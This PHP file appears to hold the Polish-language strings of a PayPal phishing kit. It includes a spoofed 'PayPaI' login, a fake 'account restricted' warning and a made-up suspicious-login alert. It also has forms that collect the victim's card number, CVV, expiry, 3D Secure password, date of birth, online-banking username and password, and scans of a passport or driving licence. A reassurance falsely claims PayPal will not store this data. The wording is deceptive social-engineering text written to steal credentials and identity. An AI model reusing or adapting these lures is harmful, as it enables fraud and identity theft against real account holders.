<?php
#LOGIN
$wiz_111 = 'Zaloguj się do swojego konta PayPaI';
$wiz_222 = 'Masz problemy z zalogowaniem się?';
$wiz_333 = 'Zapisz się';
$wiz_444 = 'Wszelkie prawa zastrzeżone dla PayPal Inc.';
$wiz_900 = 'E-mail';
$wiz_901 = 'Hasło';
$wiz_902 = 'Zaloguj Się';
#INFO
$wiz_555 = 'Profil';
$wiz_666 = 'Zaktualizuj swoje zdjęcie';
$wiz_777 = 'Witaj ponownie!';
$wiz_888 = 'Konta PayPal została ograniczona!';
$wiz_999 = 'wymagana informacja';
$wiz_903 = 'Pierwsze imię';
$wiz_904 = 'Nazwisko';
$wiz_905 = 'Adres';
$wiz_906 = 'Miasto';
$wiz_907 = 'Stan';
$wiz_910 = 'zamek błyskawiczny';
$wiz_911 = 'Numer telefonu';

#-----NAV
$wiz_101 = 'Podsumowanie';
$wiz_102 = 'Czynność';
$wiz_103 = 'Transfer';
$wiz_104 = 'Portfel';
$wiz_105 = 'Magasiner';
$wiz_106 = 'Wyloguj';
$wiz_107 = 'Menu główne';
$wiz_108 = 'Konto';
$wiz_109 = 'Bezpieczeństwo';
$wiz_112 = 'Płatności';
$wiz_113 = 'Powiadomienia';
#------FOOTER
$wiz_114 = 'POMOC / KONTAKT';
$wiz_115 = 'BEZPIECZEŃSTWO';
$wiz_116 = 'Wszelkie prawa zastrzeżone.';
$wiz_117 = 'Poszanowanie prywatności';
$wiz_118 = 'Umowy prawne';
$wiz_119 = 'Komentarze';
#-------CCV
$wiz_120 = 'Karta kredytowa';
$wiz_121 = 'Imię na karcie';
$wiz_123 = 'Numer karty';
$wiz_124 = "Exp.";
$wiz_125 = 'CVV (3-4) code';
$wiz_126 = 'Wiersz adresu';
$wiz_127 = 'Potwierdź i Procesy';
#--------VBV
$wiz_128 = 'Zapraszamy do weryfikacji™';
$wiz_129 = 'Wpisz poniżej informacje, aby potwierdzić swoją tożsamość.';
$wiz_130 = 'Data ważności karty:';
$wiz_131 = 'Kod weryfikacyjny karty:';
$wiz_132 = 'Data urodzenia:';
$wiz_133 = 'Hasło lub SecureCode(3d) :';
$wiz_134 = 'Wszelkie prawa zastrzeżone.';
#--------BANK
$wiz_135 = 'Wybierz jedną z tych banków komun';
$wiz_136 = 'Bezpieczne';
$wiz_137 = 'Mam innego banku';
$wiz_138 = "Jest bezpiecznie dzielić się tymi informacjami. PayPal nie go zapisać.";
$wiz_139 = 'klikając';
$wiz_140 = 'Kontyntynuj';
$wiz_141 = 'Zgadzam się z warunkami dotyczącymi łącząc swoje konto bankowe.';
$wiz_142 = 'Twój bank';
$wiz_143 = "Jest bezpiecznie dzielić się tymi informacjami. PayPal nie go zapisać.";
$wiz_144 = 'Username';
$wiz_145 = 'Hasło';
$wiz_146 = 'klikając';
$wiz_147 = 'Kontyntynuj';
$wiz_148 = 'Zgadzam się z warunkami dotyczącymi łącząc swoje konto bankowe.';
$wiz_149 = 'Twój bank';
$wiz_150 = 'Nazwa banku';
#--------Loading AND Police
$wiz_151 = 'Przetwarzanie';
$wiz_152 = 'Podejrzane Działania - PAYAPL';
$wiz_153 = 'Aby pomóc chronić swoje konto regularnie szukać wczesnych oznak potencjalnie oszukańczej działalności.';
$wiz_154 = 'Jesteśmy zaniepokojeni potencjalnym nieautoryzowanym aktywności';
$wiz_155 = 'Po potwierdzeniu swojej tożsamości, będziemy Cię przez kroki, aby konta bardziej bezpieczne.';
$wiz_156 = 'Zaloguj się z nieznanych urządzeń';
$wiz_157 = 'w pobliżu Ossining, USA';
$wiz_158 = 'Na wszelki wypadek, chcemy, aby upewnić się, że jest to konto.';
$wiz_159 = 'Kontakt';
$wiz_160 = 'Bezpieczeństwo';
$wiz_161 = 'Wyloguj';
$wiz_162 = 'Poniższe kroki należy całkowicie wypełnić go, aby utrzymać bezpieczeństwo koncie nad i, że nie jest to przełom';
#--------UPLOAD CART ID
$wiz_163 = 'Potwierdź swoją tożsamość';
$wiz_164 = 'Wybierz';
$wiz_165 = 'Prześlij dowód tożsamości (zalecane)';
$wiz_166 = 'Otrzymują tekst';
$wiz_167 = 'Otrzymuj zautomatyzowany telefon';
$wiz_168 = 'Błąd tej opcji nie jest dostępna na chwilę Wypróbuj inne opcje';
$wiz_169 = 'Jaki rodzaj dokumentu można przesyłać?';
$wiz_170 = 'Wymagania Pokaż pliku';
$wiz_171 = 'Pliki powinny być mniejsze niż 10 MB.';
$wiz_172 = 'Użyj jednego z tych typów plików: JPG, GIF, PNG lub PDF.';
$wiz_173 = 'Prześlij pliki, które wyświetlają się na bieżąco i czytelne szczegóły.';
$wiz_174 = 'Wybierz dowolny';
$wiz_175 = "Prawo jazdy";
$wiz_176 = 'Paszport';
$wiz_177 = 'Wojskowy ID';
?>